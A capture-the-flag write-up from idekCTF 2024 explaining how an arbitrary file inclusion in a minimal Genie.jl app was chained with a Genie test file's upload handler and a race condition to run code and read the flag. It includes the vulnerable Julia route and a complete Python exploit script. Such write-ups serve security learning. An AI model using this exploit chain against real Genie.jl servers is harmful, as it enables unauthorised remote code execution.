---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466SKFC6RUP%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T073424Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQDdM9WIfpCUh%2FQa2Kp%2BzCc2kBkU%2Fs1bvDSgsZG9375rSQIhAK7q97evE2pSgF20NLk2vagGvTwDz80kDjcgXniiyWtqKogECOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxjKVewzVCG13Xg%2BS0q3AMEHHg1qWZU4EQd913mvt20Ss2dlefHzOR00MFmqey2b76GCHVo0cJDmnRGxrGndonwOC3TfOSE75Yt2WisvQUOfWlX0QeQ6ZfaEUeJVDIUgxeA2BWE66OsYlq1Ajb2M7iyBLU4Uk3flAhgXKXrHUNX4%2BXqo8w6Tt34qZoaTMbq%2FvBnQFRMyW1SoEfHenjgRu01GQ2SoPInOqvQ%2FjPm4rCRNXb51NeezLVdHEeMz%2FYz2ZKyuFP%2FGNFj6H2r%2BhpGgK6aJU8R5k2ewCwNSLEEIXzldZWsIfm9Y96vythDBQ6hVIzGq0bd4Z1xF1v2v1K1Pkp%2BOy1vPN9%2F5b0hSdpXB8HprOGWwaKmQn2JIC8gfpVCU29d%2BLqnVLpDdI17e4RhaoMT%2ByLfglP%2BYvhuIym89RU3FicoGz8wfrD0WX%2BY9peGenXeyerYFt0WdTwngVCs6jFaAjhv1TTGUcstIL5LP2%2FGf148%2F%2Btl8vMQ2RSeVN43QkTgyEP9exyXqQrIvNrB%2B5hjs327OLt2Z4UJwjqxdqsbnbtZb%2B4wO0x%2BwXJCxr%2BLjG5%2FLNDnBF1jg3SFnXb1haIXaUDeeFfz6a%2BcR0rlWXCRGIGp8RfHQMY4V5o2yU%2B206xwIYxKz3hTamU8%2BDCas8DBBjqkAVKIkJWbnhJXmbIJfMCscDRyIx4B2i1vtMt%2BfaKiUsEgxL9nwxWsI59N25i19fy1M2QkrCZWjTKpK7t2oji6X1FuAyeed8ltqaQUqXnAw3tq%2FaFBm6FzhtVQXil9d6xrnZKyVX26ftYsj7RvTTJqh28Xg3f%2BvihyI8pHvRoyPGwyUqdzZF0EzXlL3donS9dBilSDZfnxUajdjqOpY2IpSlqHAN1r\&X-Amz-Signature=9a942d9b12adf84bbeb07227ded07173b30105a6fdfe434592e3f6fb55141c7d\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
